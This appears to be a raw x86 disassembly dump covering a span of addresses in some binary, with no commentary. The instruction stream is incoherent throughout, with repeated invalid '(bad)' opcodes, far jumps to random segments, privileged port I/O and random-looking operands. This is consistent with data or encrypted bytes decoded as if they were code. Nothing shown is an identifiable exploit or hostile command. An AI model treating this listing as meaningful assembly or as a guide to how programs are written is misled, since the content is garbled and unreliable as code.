  406afb:	fcmovbe st,st(7)
  406afd:	push   es
  406afe:	jl     0x406b49
  406b00:	push   edi
  406b01:	or     DWORD PTR [ebx+0x60],esi
  406b04:	test   DWORD PTR [eax],eax
  406b06:	fld    TBYTE PTR [ebp+edx*4-0x52]
  406b0a:	mov    edi,0x1bbae025
  406b0f:	pop    ebp
  406b10:	adc    DWORD PTR [edx],edx
  406b12:	lea    edi,[esi-0x2a]
  406b15:	mov    ds:0x46738f26,eax
  406b1a:	retf   0x245b
  406b1d:	sbb    eax,0x858dcbd
  406b22:	inc    esp
  406b23:	fild   DWORD PTR [ebx+0x68]
  406b26:	inc    edi
  406b27:	xchg   ebp,eax
  406b28:	fwait
  406b29:	jae    0x406b36
  406b2b:	(bad)  
  406b2d:	add    DWORD PTR [ebp+0x0],ecx
  406b30:	call   0xc395981d
  406b35:	shl    BYTE PTR [edx+0x258528b1],cl
  406b3b:	ins    BYTE PTR es:[edi],dx
  406b3c:	popa   
  406b3d:	fmul   DWORD PTR [esi-0x54]
  406b40:	into   
  406b41:	shl    BYTE PTR [ebx],cl
  406b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b44:	or     al,0xeb
  406b46:	inc    ebp
  406b47:	mov    edx,0x70114c18
  406b4c:	rcl    DWORD PTR [edi-0x7c],1
  406b4f:	into   
  406b50:	retf   0xd0ed
  406b53:	fcom   QWORD PTR ss:[eax+esi*8+0x5dca6df7]
  406b5b:	inc    edi
  406b5c:	daa    
  406b5d:	in     eax,dx
  406b5e:	cmp    dh,BYTE PTR [edx-0x13dae9ee]
  406b64:	data16 or BYTE PTR [ebx+0x5dda9e3a],dh
  406b6b:	fwait
  406b6c:	add    eax,0xd50e2eb2
  406b71:	pushf  
  406b72:	sbb    edi,eax
  406b74:	adc    al,0xe0
  406b76:	std    
  406b77:	push   esp
  406b78:	mov    esi,0x25346eb7
  406b7d:	mov    cl,0x67
  406b7f:	mov    ds:0xf32491ff,al
  406b84:	cmp    al,0xbe
  406b86:	out    0xd8,al
  406b88:	not    DWORD PTR [edx-0x75]
  406b8b:	mov    al,cl
  406b8d:	std    
  406b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b8f:	pop    esp
  406b90:	xchg   ecx,eax
  406b91:	pop    edx
  406b92:	xor    al,0x2e
  406b94:	lods   al,BYTE PTR ds:[esi]
  406b95:	into   
  406b96:	in     eax,dx
  406b97:	pop    eax
  406b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b99:	sub    dh,BYTE PTR [eax+0x6b]
  406b9c:	ret    0x7f1d
  406b9f:	cwde   
  406ba0:	push   0x5e149e7e
  406ba5:	inc    ecx
  406ba6:	scas   eax,DWORD PTR es:[edi]
  406ba7:	inc    ebp
  406ba8:	pop    ss
  406ba9:	dec    ebx
  406baa:	and    eax,0xb6fe0b4
  406baf:	fdiv   DWORD PTR [esi-0x3cdaedd2]
  406bb5:	aas    
  406bb6:	pop    es
  406bb7:	loop   0x406b3d
  406bb9:	out    0xb,eax
  406bbb:	add    ebp,edi
  406bbd:	pusha  
  406bbe:	daa    
  406bbf:	fidiv  DWORD PTR [edi-0x2b]
  406bc2:	pop    ss
  406bc3:	repnz inc edx
  406bc5:	shl    DWORD PTR [edx+0x10ebcb9d],1
  406bcb:	cmp    eax,0x377d039d
  406bd0:	retf   
  406bd1:	xor    ah,BYTE PTR [edx]
  406bd3:	xor    eax,0x9283c830
  406bd8:	pop    ebx
  406bd9:	sub    eax,0xc28db8c
  406bde:	imul   edi,DWORD PTR [eax-0x5315d929],0x559a446c
  406be8:	mov    dh,0x5
  406bea:	pop    esp
  406beb:	in     al,dx
  406bec:	sub    BYTE PTR [edx-0x6ec1c500],0xe6
  406bf3:	push   0x76
  406bf5:	dec    ecx
  406bf6:	fstp   QWORD PTR ss:[edi]
  406bf9:	int3   
  406bfa:	push   edx
  406bfb:	sbb    DWORD PTR [esi],esi
  406bfd:	ins    DWORD PTR es:[edi],dx
  406bfe:	push   ebx
  406bff:	jl     0x406c28
  406c01:	inc    ebx
  406c02:	inc    ebp
  406c03:	mov    esp,0xcb4737cb
  406c08:	es aaa 
  406c0a:	lahf   
  406c0b:	xchg   edx,eax
  406c0c:	push   ecx
  406c0d:	xchg   edi,eax
  406c0e:	addr16 mov eax,ds:0x35
  406c12:	jmp    0x406c76
  406c14:	jb     0x406c17
  406c16:	push   eax
  406c17:	test   eax,0x17e9921f
  406c1c:	inc    ecx
  406c1d:	lds    edi,FWORD PTR [edx]
  406c1f:	int3   
  406c20:	and    cl,0xe5
  406c23:	xor    BYTE PTR [si+0x4d72],ch
  406c28:	adc    ebp,0xa0b3e64a
  406c2e:	ret    
  406c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c30:	sar    BYTE PTR [edx+0x1e],0x89
  406c34:	popf   
  406c35:	inc    ebp
  406c36:	jo     0x406c0c
  406c38:	scas   al,BYTE PTR es:[edi]
  406c39:	cmp    al,ah
  406c3b:	lods   eax,DWORD PTR ds:[esi]
  406c3c:	in     eax,0x8a
  406c3e:	add    esi,DWORD PTR [ecx]
  406c40:	adc    BYTE PTR [esp+edx*2],cl
  406c43:	xor    eax,0xa2856e7
  406c48:	sti    
  406c49:	mov    esp,0xd0148d54
  406c4e:	xchg   DWORD PTR [ecx+esi*4-0x6a14ca0],ebx
  406c55:	dec    esp
  406c56:	mov    bl,0x5c
  406c58:	shl    DWORD PTR [edi+ebp*1],0x21
  406c5c:	mov    esi,0x73b7ec14
  406c61:	pusha  
  406c62:	shr    DWORD PTR [edx-0x2b7defa2],1
  406c68:	jmp    0x9a7f:0xe13bf244
  406c6f:	inc    esp
  406c70:	and    bh,ah
  406c72:	inc    edx
  406c73:	mov    bp,0x2f72
  406c77:	or     esi,ebx
  406c79:	outs   dx,BYTE PTR ds:[esi]
  406c7a:	jns    0x406ce9
  406c7c:	test   DWORD PTR [eax-0xa],esi
  406c7f:	test   DWORD PTR [ecx+eiz*4],0xc5deaaf3
  406c86:	xor    al,0x55
  406c88:	loope  0x406ccb
  406c8a:	push   0x1f8cdb98
  406c8f:	mov    bh,0x5
  406c91:	and    ebx,DWORD PTR ds:[esi+ebx*2+0x61c08fdf]
  406c99:	xchg   ecx,eax
  406c9a:	shl    BYTE PTR [ebx-0x7bf8aa79],0x64
  406ca1:	ret    
  406ca2:	cmp    DWORD PTR ds:0x8df5758,esp
  406ca8:	and    al,0x2f
  406caa:	dec    ebp
  406cab:	pop    es
  406cac:	cmp    eax,0x342325ca
  406cb1:	sbb    ebp,DWORD PTR [edx+esi*1-0x6cf079f6]
  406cb8:	popf   
  406cb9:	icebp  
  406cba:	test   DWORD PTR [ebx-0x4d],esp
  406cbd:	push   eax
  406cbe:	cmp    ecx,DWORD PTR [edi-0x16]
  406cc1:	dec    ebp
  406cc2:	in     eax,0xdc
  406cc4:	dec    esi
  406cc5:	mov    ebx,0x63f1d04a
  406cca:	aaa    
  406ccb:	push   ds
  406ccc:	and    esp,0x2f1ab97b
  406cd2:	arpl   WORD PTR ds:0x9ee152ae,bp
  406cd8:	pop    edx
  406cd9:	popf   
  406cda:	dec    eax
  406cdb:	jg     0x406c8f
  406cdd:	psraw  mm4,mm0
  406ce0:	xlat   BYTE PTR ds:[ebx]
  406ce1:	ret    
  406ce2:	jmp    0xdddb:0x534a3d5
  406ce9:	pop    esi
  406cea:	cmp    DWORD PTR [edx+0x285c173a],ebx
  406cf0:	fidivr WORD PTR [edx-0x6ab08acf]
  406cf6:	inc    eax
  406cf7:	mov    edi,0xffcf03e
  406cfc:	cmp    DWORD PTR [ecx+0x20dcb52c],eax
  406d02:	push   es
  406d03:	es dec esi
  406d05:	cmp    edi,esi
  406d07:	sub    esi,DWORD PTR [edx+0x38]
  406d0a:	inc    ecx
  406d0b:	lods   eax,DWORD PTR ds:[esi]
  406d0c:	enter  0x3242,0x6b
  406d10:	jno    0x406cb4
  406d12:	inc    ebp
  406d13:	adc    dl,0x26
  406d16:	mov    dh,0x38
  406d18:	inc    esi
  406d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d1a:	push   esi
  406d1b:	test   eax,0x1eef857c
  406d20:	jno    0x406d5a
  406d22:	(bad)  
  406d23:	sub    eax,0xbe6771d8
  406d28:	xchg   edi,eax
  406d29:	fnop   
  406d2b:	call   0x400df9a7
  406d30:	push   ecx
  406d31:	in     eax,dx
  406d32:	or     dl,bh
  406d34:	mov    ebp,0x22a1fe2f
  406d39:	inc    esi
  406d3a:	(bad)  
  406d3b:	mov    bl,0xc6
  406d3d:	test   al,0x28
  406d3f:	fdivr  DWORD PTR [ecx+0x67]
  406d42:	fst    QWORD PTR [edi-0x44]
  406d45:	push   ds
  406d46:	jae    0x406d0b
  406d48:	pusha  
  406d49:	mov    ch,0x7d
  406d4b:	inc    edi
  406d4c:	adc    ebp,edx
  406d4e:	test   BYTE PTR ds:0xb125c0b5,al
  406d54:	or     al,0xfe
  406d56:	and    ah,BYTE PTR [ecx]
  406d58:	xchg   edx,eax
  406d59:	ja     0x406d94
  406d5b:	test   al,0xce
  406d5d:	add    al,0x64
  406d5f:	loop   0x406daa
  406d61:	lock sub DWORD PTR [eiz*1-0x20cdafe2],0xae80af95
  406d6d:	mov    ebx,esi
  406d6f:	xor    eax,0x4d226c94
  406d74:	sar    BYTE PTR [edi+0x15],cl
  406d77:	lods   al,BYTE PTR ds:[esi]
  406d78:	cmp    DWORD PTR [edx+0x2a],ecx
  406d7b:	push   esi
  406d7c:	call   0xd35aab88
  406d81:	pop    edi
  406d82:	sbb    DWORD PTR [esi],edx
  406d84:	push   ds
  406d85:	nop
  406d86:	and    edx,DWORD PTR [eax-0x106c9b0b]
  406d8c:	inc    esi
  406d8d:	add    eax,0xe188682d
  406d92:	pop    esp
  406d93:	mov    esi,0x1eb3459f
  406d98:	rol    BYTE PTR [ebx+0x334b9d86],1
  406d9e:	ds sub esp,esi
  406da1:	and    ebp,DWORD PTR [ecx-0x58f487a5]
  406da7:	mov    edi,0x8eb21ffd
  406dac:	out    dx,al
  406dad:	test   BYTE PTR [esi+0x5e],0x5b
  406db1:	les    ecx,FWORD PTR [ebx-0x75]
  406db4:	mov    BYTE PTR [eax+0x2a72f1b9],bl
  406dba:	bound  ebx,QWORD PTR [edi]
  406dbc:	mov    esp,0x67460383
  406dc1:	jns    0x406d5e
  406dc3:	shl    BYTE PTR [edi],1
  406dc5:	mov    ebp,0x7c7b363a
  406dca:	out    0xd7,al
  406dcc:	push   ds
  406dcd:	xor    DWORD PTR [edi],ebx
  406dcf:	xchg   esp,eax
  406dd0:	into   
  406dd1:	or     al,0x92
  406dd3:	stos   BYTE PTR es:[edi],al
  406dd4:	sub    edi,eax
  406dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd7:	sbb    ch,cl
  406dd9:	mov    cs,WORD PTR [ecx-0x26112e70]
  406ddf:	mov    ds:0xd9762e13,al
  406de4:	lahf   
  406de5:	ss push edx
  406de7:	sbb    eax,DWORD PTR [ebx+ebp*8]
  406dea:	pusha  
  406deb:	ss leave 
  406ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dee:	xchg   edx,eax
  406def:	nop
  406df0:	xchg   ebx,eax
  406df1:	leave  
  406df2:	xor    dh,BYTE PTR [esi+edx*8]
  406df5:	loope  0x406e5e
  406df7:	and    eax,0x50270aef
  406dfc:	les    edi,FWORD PTR [edi-0x63]
  406dff:	xor    DWORD PTR [edi+0x1],ecx
  406e02:	mov    bl,0xb
  406e04:	jl     0x406e65
  406e06:	cmp    DWORD PTR [edx+0x18],edx
  406e09:	pop    es
  406e0a:	xor    dl,BYTE PTR [esi-0x48e214f0]
  406e10:	xchg   esp,eax
  406e11:	sub    eax,0xb9065337
  406e16:	ins    DWORD PTR es:[edi],dx
  406e17:	push   ebx
  406e18:	xor    BYTE PTR [esi-0x279bfca0],dh
  406e1e:	scas   al,BYTE PTR es:[edi]
  406e1f:	pop    eax
  406e20:	in     eax,dx
  406e21:	adc    BYTE PTR [esi],dh
  406e23:	add    al,0x95
  406e25:	inc    eax
  406e26:	iret   
  406e27:	popa   
  406e28:	ja     0x406dca
  406e2a:	ret    0xa6b
  406e2d:	bound  edi,QWORD PTR [edx+0x27]
  406e30:	stos   BYTE PTR es:[edi],al
  406e31:	sub    DWORD PTR [ecx+0x6a5eba6d],0xffffff9c
  406e38:	sbb    al,0x42
  406e3a:	mov    bl,0xfb
  406e3c:	enter  0xbb2b,0xc5
  406e40:	and    al,0xc0
  406e42:	xor    al,0x1a
  406e44:	imul   ebp,DWORD PTR [ebx],0x18
  406e47:	ja     0x406dcc
  406e49:	mov    ah,0x3c
  406e4b:	inc    edi
  406e4c:	jo     0x406dd0
  406e4e:	nop
  406e4f:	(bad)  
  406e50:	test   al,0xd1
  406e52:	retf   
  406e53:	retf   0xb84
  406e56:	xor    BYTE PTR ds:0x75f447f3,0xae
  406e5d:	push   esi
  406e5e:	loopne 0x406e53
  406e60:	sub    DWORD PTR [edi+0x16],ebx
  406e63:	xchg   BYTE PTR [ebx-0x2456521d],dh
  406e69:	sub    al,0xe7
  406e6b:	mov    edx,0x5790040f
  406e70:	scas   eax,DWORD PTR es:[edi]
  406e71:	or     eax,0xde7b9ecf
  406e76:	ficomp DWORD PTR [esp+eiz*2-0x1941414c]
  406e7d:	jp     0x406edf
  406e7f:	sbb    BYTE PTR [eax+edx*4],al
  406e82:	xchg   ch,bl
  406e84:	push   0xffffff8b
  406e86:	mov    eax,ds:0x7c8561fe
  406e8b:	adc    DWORD PTR [eax],edx
  406e8d:	push   eax
  406e8e:	loope  0x406e47
  406e90:	test   DWORD PTR [eax],edx
  406e92:	cmp    eax,0xebf52a7
  406e97:	adc    ecx,DWORD PTR [edx]
  406e99:	dec    ebx
  406e9a:	jno    0x406f0f
  406e9c:	repz mov edx,0x5b3861da
  406ea2:	cmp    BYTE PTR [ebx-0x45],ah
  406ea5:	mov    DWORD PTR [ecx-0x4f20c559],ebx
  406eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eac:	outs   dx,BYTE PTR ds:[esi]
  406ead:	sub    ebp,DWORD PTR [edi-0x60]
  406eb0:	sbb    esp,DWORD PTR [esi+edi*1-0x7f]
  406eb4:	ss jne 0x406e5e
  406eb7:	cmp    ebp,DWORD PTR [esi+0x1a650ad7]
  406ebd:	jmp    0xf68475b7
  406ec2:	adc    edi,edi
  406ec4:	inc    eax
  406ec5:	push   eax
  406ec6:	xchg   esi,eax
  406ec7:	fsubr  DWORD PTR [ebx-0x5b]
  406eca:	mov    bh,bl
  406ecc:	and    bl,cl
  406ece:	xchg   esi,ecx
  406ed0:	std    
  406ed1:	call   0xd1c2:0x36052568
  406ed8:	mov    edx,0x1ac79784
  406edd:	dec    ecx
  406ede:	stc    
  406edf:	pop    ss
  406ee0:	imul   esp,DWORD PTR [edi],0xa40c5a57
  406ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ee7:	jge    0x406ec2
  406ee9:	lahf   
  406eea:	pusha  
  406eeb:	bound  ebx,QWORD PTR [edx-0x80]
  406eee:	call   0xe7e36ad
  406ef3:	push   ebp
  406ef4:	push   ds
  406ef5:	das    
  406ef6:	outs   dx,BYTE PTR ds:[esi]
  406ef7:	ftst   
  406ef9:	ret    
  406efa:	mov    ebx,0x75aefd43
  406eff:	loop   0x406edc
  406f01:	cwde   
  406f02:	sub    bl,cl
  406f04:	mov    ds:0xe106a457,al
  406f09:	adc    dl,BYTE PTR [ebx+ecx*8]
  406f0c:	shl    DWORD PTR [esi-0x2d],1
  406f0f:	leave  
  406f10:	ficomp DWORD PTR [esi+0x69]
  406f13:	test   al,0xd4
  406f15:	xor    edi,DWORD PTR [edi+0x10]
  406f18:	or     edx,DWORD PTR [esi+ebx*1+0x676ac1c3]
  406f1f:	jns    0x406f18
  406f21:	xchg   DWORD PTR [edx-0x6c3be681],ebx
  406f27:	xchg   esp,eax
  406f28:	test   BYTE PTR [edi*1+0x10904cab],cl
  406f2f:	xor    BYTE PTR [ebx],ch
  406f31:	shl    dl,1
  406f33:	fistp  DWORD PTR [ebx+0x1c]
  406f36:	mov    eax,ds:0xb22a4f9a
  406f3b:	aas    
  406f3c:	xor    eax,0x5dbb89b0
  406f41:	sahf   
  406f42:	hlt    
  406f43:	js     0x406f4e
  406f45:	in     al,0x7d
  406f47:	sub    al,0x82
  406f49:	in     al,dx
  406f4a:	ja     0x406f50
  406f4c:	mov    ds:0x1dbda01,al
  406f51:	les    esi,FWORD PTR [ebx-0x31d181dd]
  406f57:	xchg   edx,eax
  406f58:	cli    
  406f59:	enter  0x8d7a,0xa5
  406f5d:	or     BYTE PTR [ecx-0x11],ah
  406f60:	sar    DWORD PTR [edi],1
  406f62:	sbb    ah,ah
  406f64:	aaa    
  406f65:	mov    esp,0xff069b4
  406f6a:	fldcw  WORD PTR [esp+ecx*2]
  406f6d:	or     al,BYTE PTR [ebx-0x69]
  406f70:	mov    ebx,0x767c4dfb
  406f75:	(bad)  
  406f76:	(bad)  
  406f77:	push   esp
  406f78:	icebp  
  406f79:	pop    ss
  406f7a:	jne    0x406fc4
  406f7c:	cmp    ch,bl
  406f7e:	shl    DWORD PTR [ecx],0xea
  406f81:	jge    0x406f0f
  406f83:	mov    BYTE PTR [eax+0x12bc1fd6],bl
  406f89:	loop   0x406fab
  406f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f8c:	jbe    0x406fe7
  406f8e:	push   cs
  406f8f:	test   al,al
  406f91:	scas   eax,DWORD PTR es:[edi]
  406f92:	ret    
  406f93:	pop    ss
  406f94:	inc    edx
  406f95:	aaa    
  406f96:	push   edi
  406f97:	out    dx,al
  406f98:	add    ecx,DWORD PTR [ebx+esi*4]
  406f9b:	xchg   edx,eax
  406f9c:	push   ebx
  406f9d:	retf   0xb89d
  406fa0:	(bad)  
  406fa2:	loopne 0x406fa1
  406fa4:	mov    ecx,0x67775e14
  406fa9:	(bad)  
  406faa:	xchg   esi,eax
  406fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fac:	mov    eax,0xb5af6a79
  406fb1:	add    BYTE PTR [ebp+0x47],dh
  406fb4:	int    0x18
  406fb6:	dec    esp
  406fb7:	das    
  406fb8:	sahf   
  406fb9:	call   0x197a:0x25f72fbe
  406fc0:	dec    ecx
  406fc1:	mov    bl,0xf7
  406fc3:	jle    0x40703b
  406fc5:	(bad)  
  406fc6:	(bad)  
  406fc7:	adc    eax,0x4932ec0
  406fcc:	(bad)  
  406fcd:	mov    edx,0xf8bd6577
  406fd2:	call   0x2f70c15a
  406fd7:	adc    eax,0x7ad61b4a
  406fdc:	hlt    
  406fdd:	loope  0x406fa4
  406fdf:	pop    eax
  406fe0:	push   cs
  406fe1:	adc    edi,esp
  406fe3:	and    DWORD PTR [ecx],esi
  406fe5:	mov    dh,0xa0
  406fe7:	cmp    BYTE PTR [ebp+0x3b],ch
  406fea:	pop    ds
  406feb:	mov    ch,0xfa
  406fed:	add    ah,BYTE PTR [edi]
  406fef:	mov    eax,0x4397cce
  406ff4:	stos   BYTE PTR es:[edi],al
  406ff5:	mov    bh,0x54
  406ff7:	inc    esp
  406ff8:	add    eax,0x90aa6e5b
  406ffd:	mov    esi,0x418c8013
  407002:	push   cs
  407003:	push   esi
  407004:	fwait
  407005:	es jae 0x407059
  407008:	cmp    al,0x5d
  40700a:	stos   DWORD PTR es:[edi],eax
  40700b:	cmp    BYTE PTR [edi],bh
  40700d:	ss inc eax
  40700f:	fabs   
  407011:	push   0x78
  407013:	mov    ah,0x4f
  407015:	sub    edi,edx
  407017:	pop    esp
  407018:	jns    0x406fd8
  40701a:	sahf   
  40701b:	icebp  
  40701c:	cs push es
  40701e:	(bad)  
  40701f:	nop
  407020:	jno    0x406ff1
  407022:	pop    esp
  407023:	add    eax,0x681ba0c9
  407028:	inc    edx
  407029:	les    edi,FWORD PTR [edi+0x5a]
  40702c:	add    ecx,DWORD PTR [edx+0x36de87a2]
  407032:	popf   
  407033:	xor    esp,ecx
  407035:	sbb    esi,DWORD PTR [ecx]
  407037:	pop    ebp
  407038:	into   
  407039:	icebp  
  40703a:	push   0x55
  40703c:	and    dl,BYTE PTR [esi+0x1b]
  40703f:	pop    esi
  407040:	daa    
  407041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407042:	mov    dl,0x29
  407044:	jae    0x406fe3
  407046:	mov    al,ds:0x2f6448ea
  40704b:	out    0x5a,eax
  40704d:	jl     0x407086
  40704f:	loopne 0x406ffc
  407051:	sahf   
  407052:	loop   0x40702c
  407054:	sbb    ebp,DWORD PTR [edi]
  407056:	xor    eax,0xffc564a0
  40705b:	lods   eax,DWORD PTR ds:[esi]
  40705c:	pop    esi
  40705d:	add    DWORD PTR [eax-0x54d014f7],0x400d52ad
  407067:	jnp    0x406ff8
  407069:	mov    ds:0x5ca45d6e,al
  40706e:	and    eax,0xdf26cd55
  407073:	lock mov DWORD PTR [esi],edi
  407076:	add    edx,DWORD PTR [ecx-0xf]
  407079:	bnd jnp 0x4070cf
  40707c:	pop    ebx
  40707d:	addr16 pop eax
  40707f:	sahf   
  407080:	in     al,dx
  407081:	repnz pop edx
  407083:	and    ecx,ebx
  407085:	das    
  407086:	aas    
  407087:	xchg   ebp,eax
  407088:	pop    esi
  407089:	inc    edx
  40708a:	mov    ch,0x1d
  40708c:	cwde   
  40708d:	and    al,0x80
  40708f:	clc    
  407090:	clc    
  407091:	mov    ds:0xcc23e77c,eax
  407096:	outs   dx,BYTE PTR ds:[esi]
  407097:	sbb    BYTE PTR [edx+0x7a857575],ch
  40709d:	xor    DWORD PTR [ecx-0x15],edx
  4070a0:	mov    gs,WORD PTR [eax+0x60]
  4070a3:	sahf   
  4070a4:	or     ch,cl
  4070a6:	jg     0x407104
  4070a8:	adc    eax,0xf007bb41
  4070ad:	mov    WORD PTR [eax+0x347d9fe2],gs
  4070b3:	std    
  4070b4:	loop   0x40712e
  4070b6:	in     eax,0xe3
  4070b8:	lods   eax,DWORD PTR ds:[esi]
  4070b9:	fimul  DWORD PTR [edi-0x3b546d4]
  4070bf:	add    DWORD PTR [edi],esi
  4070c1:	ret    
  4070c2:	iret   
  4070c3:	xchg   edx,eax
  4070c4:	(bad)  
  4070c5:	xlat   BYTE PTR ds:[ebx]
  4070c6:	std    
  4070c7:	nop
  4070c8:	push   es
  4070c9:	repz jle 0x407057
  4070cc:	ins    BYTE PTR es:[edi],dx
  4070cd:	mov    edx,0x84e1f4f0
  4070d2:	inc    eax
  4070d3:	dec    esp
  4070d4:	aaa    
  4070d5:	jno    0x407095
  4070d7:	clc    
  4070d8:	xor    eax,0x8b3d2dcc
  4070dd:	xor    eax,0x4992013b
  4070e2:	xchg   ebx,eax
  4070e3:	inc    esp
  4070e4:	add    al,0x9f
  4070e6:	(bad)  
  4070e7:	outs   dx,BYTE PTR ds:[esi]
  4070e8:	pop    esp
  4070e9:	pusha  
  4070ea:	outs   dx,DWORD PTR ds:[esi]
  4070eb:	sbb    BYTE PTR [edx+0x6],0x7c
  4070ef:	or     al,0xfd
  4070f1:	jl     0x4070d4
  4070f3:	stos   DWORD PTR es:[edi],eax
  4070f4:	and    al,0x32
  4070f6:	mov    ds:0x48a1e49e,eax
  4070fb:	mov    bl,BYTE PTR [edi]
  4070fd:	retf   0x846a
  407100:	pop    ecx
  407101:	adc    ebp,DWORD PTR [edx]
  407103:	(bad)  
  407104:	stos   DWORD PTR es:[edi],eax
  407105:	push   ebx
  407106:	mov    cl,0x61
  407108:	pop    es
  407109:	and    al,0xe1
  40710b:	rcl    DWORD PTR [edi-0x494e7dd2],cl
  407111:	in     al,dx
  407112:	int    0xa1
  407114:	jb     0x4070f2
  407116:	jle    0x407107
  407118:	loop   0x4070a2
  40711a:	jmp    0x50dd56c
  40711f:	aad    0x33
  407121:	shr    DWORD PTR [ecx],0x50
  407124:	pop    ss
  407125:	mov    ds:0x19b575e2,al
  40712a:	sbb    DWORD PTR [ecx+0x77fd66ed],ebp
  407130:	lea    edi,[ecx-0x40]
  407133:	(bad)
  407136:	shr    BYTE PTR [ecx+0x57422a62],1
  40713c:	inc    ebx
  40713d:	sub    BYTE PTR [ebx+0x643746db],ah
  407143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407144:	out    dx,eax
  407145:	pop    esp
  407146:	ins    BYTE PTR es:[edi],dx
  407147:	cmp    eax,DWORD PTR [esi]
  407149:	cwde   
  40714a:	cmp    dh,BYTE PTR [esi-0xc012e81]
  407150:	push   0xffffffd4
  407152:	nop
  407153:	mov    eax,0xe84d8425
  407158:	pop    ds
  407159:	dec    ebp
  40715a:	ret    0x242c
  40715d:	fstp   DWORD PTR [eax-0x116433d6]
  407163:	cs cmc 
  407165:	hlt    
  407166:	and    BYTE PTR [eax+0x6abd7608],dh
  40716c:	jae    0x4071d8
  40716e:	add    BYTE PTR [esi+eax*2+0x53],ah
  407172:	mov    dl,0x17
  407174:	sub    al,0x6c
  407176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407177:	outs   dx,BYTE PTR ds:[esi]
  407178:	push   ds
  407179:	in     eax,dx
  40717a:	ins    BYTE PTR es:[edi],dx
  40717b:	retf   0xf766
  40717e:	retf   
  40717f:	inc    esp
  407180:	sbb    ch,BYTE PTR [edx-0x41c0975c]
  407186:	xor    cl,ch
  407188:	mov    bl,0xf
  40718a:	fimul  WORD PTR [edi-0x75]
  40718d:	and    ah,BYTE PTR [esi-0x3443ae8b]
  407193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407194:	cmp    dl,BYTE PTR [edi]
  407196:	sub    al,0xd6
  407198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407199:	or     DWORD PTR [edi+0x2e9f4960],ebp
  40719f:	cmc    
  4071a0:	or     eax,0xdd7ec95b
  4071a5:	push   ss
  4071a6:	pop    ebp
  4071a7:	jle    0x4071a1
  4071a9:	imul   ebp,edx,0x20848f81
  4071af:	mov    ds:0x8802e045,eax
  4071b4:	jae    0x4071e9
  4071b6:	sub    bh,BYTE PTR [esi-0x68]
  4071b9:	xor    bh,bl
  4071bb:	ds int3 
  4071bd:	dec    edx
  4071be:	test   al,0x43
  4071c0:	lea    ebp,[esi-0x43b0bac3]
  4071c6:	cmp    BYTE PTR [edi+0x66],0x7e
  4071ca:	test   BYTE PTR [esi-0x2f],0x9c
  4071ce:	cmc    
  4071cf:	das    
  4071d0:	aaa    
  4071d1:	jnp    0x4071a9
  4071d3:	bound  ebp,QWORD PTR [ebx-0x4c]
  4071d6:	push   ebp
  4071d7:	mov    edx,0x919ba090
  4071dc:	pop    esp
  4071dd:	lods   al,BYTE PTR fs:[esi]
  4071df:	push   es
  4071e0:	adc    BYTE PTR [ecx+0x22],ah
  4071e3:	data16 in al,dx
  4071e5:	rcl    DWORD PTR [edi-0x4f751c5c],cl
  4071eb:	and    al,0xc6
  4071ed:	mov    eax,0xe7dc1e9a
  4071f2:	int3   
  4071f3:	mov    al,0x73
  4071f5:	xchg   edx,eax
  4071f6:	sar    DWORD PTR [edx-0xd],0xda
  4071fa:	popa   
  4071fb:	inc    ebp
  4071fc:	dec    ecx
  4071fd:	pop    esp
  4071fe:	out    0x57,eax
  407200:	push   ss
  407201:	repz sub ebx,edx
  407204:	pop    esp
  407205:	pop    ebp
  407206:	in     al,dx
  407207:	jle    0x4071b1
  407209:	ss inc edx
  40720b:	and    DWORD PTR [ebp+ebx*1-0x74e73249],esi
  407212:	mov    ds:0x84419631,eax
  407217:	dec    esp
  407218:	(bad)
  40721b:	mov    BYTE PTR [ecx],bh
  40721d:	sbb    eax,0xd6435231
  407222:	inc    ecx
  407223:	push   esp
  407224:	sbb    DWORD PTR [ebx+0x9],edi
  407227:	jecxz  0x4071ec
  407229:	mov    ds:0x614b59a,eax
  40722e:	mov    dl,0xfd
  407230:	pop    edx
  407231:	icebp  
  407232:	pop    esi
  407233:	push   esi
  407234:	shr    bl,cl
  407236:	in     eax,dx
  407237:	mov    ds:0x26a252c9,al
  40723c:	fmul   QWORD PTR [edx]
  40723e:	call   FWORD PTR [eax]
  407240:	and    cl,BYTE PTR [ebx]
  407242:	inc    edi
  407243:	retf   
  407244:	daa    
  407245:	aam    0x41
  407247:	jg     0x407260
  407249:	scas   al,BYTE PTR es:[edi]
  40724a:	mov    cl,0x3c
  40724c:	enter  0xaa3e,0xee
  407250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407251:	(bad)  
  407252:	sbb    al,0x90
  407254:	mul    DWORD PTR [ebx]
  407256:	dec    esi
  407257:	leave  
  407258:	les    edx,FWORD PTR [esi-0x50]
  40725b:	loopne 0x40729d
  40725d:	xchg   esi,eax
  40725e:	ins    BYTE PTR es:[edi],dx
  40725f:	mov    ebx,0x9975cb92
  407264:	call   0x2a58:0x66c41492
  40726b:	jo     0x4072ea
  40726d:	int3   
  40726e:	pop    ebp
  40726f:	jae    0x407268
  407271:	inc    ecx
  407272:	fwait
  407273:	pushf  
  407274:	ins    BYTE PTR es:[edi],dx
  407275:	mov    ds:0x845929e7,eax
  40727a:	ror    BYTE PTR [ebx],1
  40727c:	shl    DWORD PTR [ebx-0x43],cl
  40727f:	rcr    edx,1
  407281:	sbb    eax,0xaa711512
  407286:	or     DWORD PTR [esi],esi
  407288:	cmp    edx,DWORD PTR [ecx+0x498bf85d]
  40728e:	rcr    DWORD PTR [eax+ebx*2],cl
  407291:	mov    BYTE PTR [ecx+0x68],ah
  407294:	push   esp
  407295:	mov    ebx,0xaec42e3
  40729a:	xlat   BYTE PTR ds:[ebx]
